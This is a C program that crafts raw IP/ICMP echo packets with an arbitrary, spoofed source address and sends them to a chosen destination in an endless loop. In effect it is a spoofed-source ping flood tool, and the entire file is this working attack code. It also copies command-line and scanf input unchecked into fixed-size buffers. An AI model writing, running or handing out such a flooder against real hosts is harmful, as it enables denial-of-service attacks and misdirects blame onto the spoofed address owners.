#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#include <arpa/inet.h>

#define PACKET_SIZE 60

#define SOURCE_ADDR sbuffer
#define DEST_ADDR dbuffer

unsigned short in_cksum(unsigned short *addr, int len);

struct ip ip_pkg;
struct udphdr udp_pkg;
struct icmp icmp_pkg;
int sockfd;
const int yes = 1;
struct sockaddr_in iaddr;
u_char *packet;
struct sigaction sa;

char sbuffer[255], dbuffer[255];

void interrupt_handler(int sig)
{
	printf(/*"C*/"leaning up and exiting...\n");
	free(packet);
	exit(0);
}

int main(int argc, char* argv[])
{
	if(argc != 3)
	{
		printf("\nUsage: \"%s SOURCEADDR DESTADDR\"\n\nRunning in interactive mode...\n", argv[0]);
		printf("Source host address: ");
		scanf("%s", sbuffer);
		printf("Destination host address: ");
		scanf("%s", dbuffer);
	}
	else
	{
		strcpy(sbuffer, argv[1]);
		strcpy(dbuffer, argv[2]);
	}
	
	sa.sa_handler = interrupt_handler;
	sa.sa_flags = 0;
	sigemptyset(&sa.sa_mask);
	
	if (sigaction(SIGINT, &sa, NULL) == -1) {
		perror("sigaction");
		return 1;
	}
	
	printf("Setting up IP part...\n");
	
	packet = (u_char*) malloc(PACKET_SIZE);
	ip_pkg.ip_hl = 5;
	ip_pkg.ip_v = 4;
	ip_pkg.ip_tos = 0;
	ip_pkg.ip_len = htons(60);
	ip_pkg.ip_id = htons(12830);
	ip_pkg.ip_off = 0;
	ip_pkg.ip_ttl = 64;
	ip_pkg.ip_p = IPPROTO_ICMP;
	ip_pkg.ip_sum = 0;
	ip_pkg.ip_src.s_addr = inet_addr(SOURCE_ADDR);
	ip_pkg.ip_dst.s_addr = inet_addr(DEST_ADDR);
	ip_pkg.ip_sum = in_cksum((unsigned short *)&ip_pkg, sizeof(ip_pkg));
	
	memcpy(packet, &ip_pkg, sizeof(ip_pkg));
	
	printf("done!\n");
	
	printf("Setting up ICMP part...\n");
	
	icmp_pkg.icmp_type = ICMP_ECHO;
	icmp_pkg.icmp_code = 0;
	icmp_pkg.icmp_id = 1000;
	icmp_pkg.icmp_seq = 0;
	icmp_pkg.icmp_cksum = 0;
	icmp_pkg.icmp_cksum = in_cksum((unsigned short *)&icmp_pkg, 8);
	
	memcpy(packet + 20, &icmp_pkg, 8);
	
	printf("done!\n");
	
	printf("Setting up socket...\n");
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("socket");
		return 1;
	}
	printf("done!\n");
	
	printf("Telling socket to send my packet without header...\n");
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof(yes)) < 0)
	{
		perror("setsockopt");
		return 1;
	}
	memset(&iaddr, 0, sizeof(iaddr));
	
	printf("done!\n");
	
	iaddr.sin_family = AF_INET;
	iaddr.sin_addr.s_addr = ip_pkg.ip_dst.s_addr;
	
	printf("Sending packets...\n");
	
	while(1)
	{
		if(sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr*) &iaddr, sizeof(struct sockaddr)) < 0)
		{
			perror("sendto");
			break;
		}
	}
	free(packet);
	return 1;
}


//NOT MINE! (From "BSD Tahoe")
unsigned short in_cksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}
